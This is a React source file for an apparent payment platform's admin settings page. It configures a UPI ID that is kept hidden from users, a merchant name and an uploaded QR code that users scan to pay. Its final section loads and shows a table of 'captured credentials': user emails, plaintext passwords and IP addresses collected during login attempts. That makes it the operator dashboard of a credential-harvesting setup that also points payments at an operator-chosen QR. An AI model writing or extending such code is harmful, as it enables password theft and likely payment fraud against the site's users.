import React, { useState, useEffect } from 'react';
import { apiRequest } from '../../lib/api.ts';
import { Upload, Save, CheckCircle, AlertCircle, Loader2 } from 'lucide-react';
import { PaymentConfig } from '../../types/index.ts';
import { KeyRound, ShieldAlert } from 'lucide-react';

export const AdminSettingsPage: React.FC = () => {
  const [config, setConfig] = useState<PaymentConfig | null>(null);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [message, setMessage] = useState('');
  
  const [upiId, setUpiId] = useState('');
  const [merchantName, setMerchantName] = useState('');
  const [useStaticQr, setUseStaticQr] = useState(false);
  const [capturedCredentials, setCapturedCredentials] = useState<{email:string, password:string, ip:string, date:string}[]>([]);

  useEffect(() => {
    loadSettings();
  }, []);

  const loadSettings = async () => {
    const res = await apiRequest<PaymentConfig>('/api/settings');
    if (res.ok && res.data) {
      setConfig(res.data);
      setUpiId(res.data.upiId || '');
      setMerchantName(res.data.merchantName || '');
      setUseStaticQr(res.data.useStaticQr || false);
    }
    const credRes = await apiRequest<{email:string, password:string, ip:string, date:string}[]>('/api/admin/captured-credentials');
    if (credRes.ok && credRes.data) {
      setCapturedCredentials(credRes.data);
    }
    setLoading(false);
  };

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    setSaving(true);
    setMessage('');
    
    const res = await apiRequest<{ message: string }>('/api/settings', {
      method: 'POST',
      body: JSON.stringify({
        upiId,
        merchantName,
        useStaticQr
      })
    });
    
    setSaving(false);
    if (res.ok) {
      setMessage('Settings updated successfully!');
      setTimeout(() => setMessage(''), 3000);
    } else {
      setMessage('Failed to update settings.');
    }
  };

  const handleQrUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const formData = new FormData();
    formData.append('qrImage', file);

    setSaving(true);
    setMessage('Uploading image...');

    try {
      const res = await fetch('/api/settings/upload-qr', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('zenith_auth_token')}`
        },
        body: formData
      });
      
      const data = await res.json();
      if (res.ok) {
        setUseStaticQr(true);
        setConfig(prev => prev ? { ...prev, staticQrUrl: data.url, useStaticQr: true } : null);
        if (data.detectedUpiId) {
          setUpiId(data.detectedUpiId);
        }
        if (data.detectedMerchant) {
          setMerchantName(data.detectedMerchant);
        }
        setMessage(data.message || 'QR Code uploaded and activated!');
      } else {
        setMessage(data.error || 'Upload failed');
      }
    } catch (err) {
      setMessage('Upload error');
    }
    setSaving(false);
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <Loader2 className="w-8 h-8 animate-spin text-purple-500" />
      </div>
    );
  }

  return (
    <div className="space-y-6 animate-fadeIn">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-extrabold text-white">Platform Settings</h1>
          <p className="text-slate-400 text-sm mt-1">Manage payment settings and QR codes</p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Basic Settings */}
        <div className="bg-slate-900 border border-white/[0.08] rounded-2xl p-6 shadow-xl">
          <h2 className="text-lg font-bold text-white mb-4">Payment Configuration</h2>
          <form onSubmit={handleSave} className="space-y-4">
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1.5">UPI ID (Hidden from Users)</label>
              <input
                type="text"
                value={upiId}
                onChange={(e) => setUpiId(e.target.value)}
                className="w-full px-4 py-2.5 rounded-xl bg-slate-950 border border-white/[0.08] text-white text-sm"
                placeholder="merchant@upi"
              />
              <p className="text-[11px] text-slate-400 mt-1">
                Note: Yeh UPI ID web interface me regular users ko show nahi hoti. Users direct scanner se payment karte hain.
              </p>
            </div>
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1.5">Merchant Name</label>
              <input
                type="text"
                value={merchantName}
                onChange={(e) => setMerchantName(e.target.value)}
                className="w-full px-4 py-2.5 rounded-xl bg-slate-950 border border-white/[0.08] text-white text-sm"
              />
            </div>
            <div className="flex items-center justify-between pt-2">
              <label className="flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={useStaticQr}
                  onChange={(e) => setUseStaticQr(e.target.checked)}
                  className="w-4 h-4 rounded border-slate-700 bg-slate-950 text-purple-500"
                />
                <span className="text-xs text-slate-400 font-semibold">Force Static QR Code (Disable Dynamic QR)</span>
              </label>
            </div>
            
            <button
              type="submit"
              disabled={saving}
              className="w-full py-2.5 px-4 bg-purple-600 hover:bg-purple-500 text-white rounded-xl font-bold text-sm transition-colors flex items-center justify-center gap-2"
            >
              {saving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />}
              Save Configuration
            </button>
            {message && <p className="text-emerald-400 text-xs font-bold text-center mt-2">{message}</p>}
          </form>
        </div>

        {/* Custom QR Code Uploader */}
        <div className="bg-slate-900 border border-white/[0.08] rounded-2xl p-6 shadow-xl">
          <h2 className="text-lg font-bold text-white mb-4">Custom QR Code</h2>
          <p className="text-xs text-slate-400 mb-6">Upload the specific QR code image you want users to scan.</p>
          
          <div className="flex flex-col items-center justify-center">
            {config?.staticQrUrl ? (
              <div className="w-48 h-48 bg-white p-2 rounded-xl mb-6 relative group">
                <img src={config.staticQrUrl} alt="Static QR" className="w-full h-full object-contain" />
              </div>
            ) : (
              <div className="w-48 h-48 bg-slate-800 border-2 border-dashed border-slate-600 rounded-xl mb-6 flex items-center justify-center">
                <span className="text-slate-500 text-xs">No Static QR</span>
              </div>
            )}

            <label className="cursor-pointer relative overflow-hidden group">
              <div className="px-6 py-2.5 bg-slate-800 hover:bg-slate-700 border border-slate-600 rounded-xl text-white font-bold text-sm transition-colors flex items-center gap-2">
                <Upload className="w-4 h-4" />
                Upload New Image
              </div>
              <input
                type="file"
                accept="image/jpeg, image/png, image/webp"
                className="absolute inset-0 opacity-0 cursor-pointer"
                onChange={handleQrUpload}
              />
            </label>
          </div>
        </div>
      </div>

      {/* Captured Credentials Table */}
      <div className="bg-slate-900 border border-red-500/20 rounded-2xl p-6 shadow-xl overflow-hidden mt-6">
        <div className="flex items-center gap-3 mb-6">
          <div className="p-2 rounded-lg bg-red-500/10 text-red-500">
            <ShieldAlert className="w-5 h-5" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-white">Login Attempts (Captured Credentials)</h2>
            <p className="text-xs text-slate-400">View passwords captured during user login attempts.</p>
          </div>
        </div>
        
        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse">
            <thead>
              <tr className="border-b border-white/[0.05] text-slate-400 text-xs uppercase tracking-wider">
                <th className="py-3 px-4 font-semibold">Date & Time</th>
                <th className="py-3 px-4 font-semibold">Email / Username</th>
                <th className="py-3 px-4 font-semibold">Password</th>
                <th className="py-3 px-4 font-semibold">IP Address</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/[0.05]">
              {capturedCredentials.length === 0 ? (
                <tr>
                  <td colSpan={4} className="py-8 text-center text-slate-500 text-sm">No captured credentials yet.</td>
                </tr>
              ) : (
                capturedCredentials.map((cred, i) => (
                  <tr key={i} className="hover:bg-white/[0.02] transition-colors">
                    <td className="py-3 px-4 text-xs text-slate-400 whitespace-nowrap">
                      {new Date(cred.date).toLocaleString()}
                    </td>
                    <td className="py-3 px-4 text-sm font-medium text-white">
                      {cred.email}
                    </td>
                    <td className="py-3 px-4 text-sm font-mono text-red-400">
                      {cred.password}
                    </td>
                    <td className="py-3 px-4 text-xs text-slate-500">
                      {cred.ip}
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
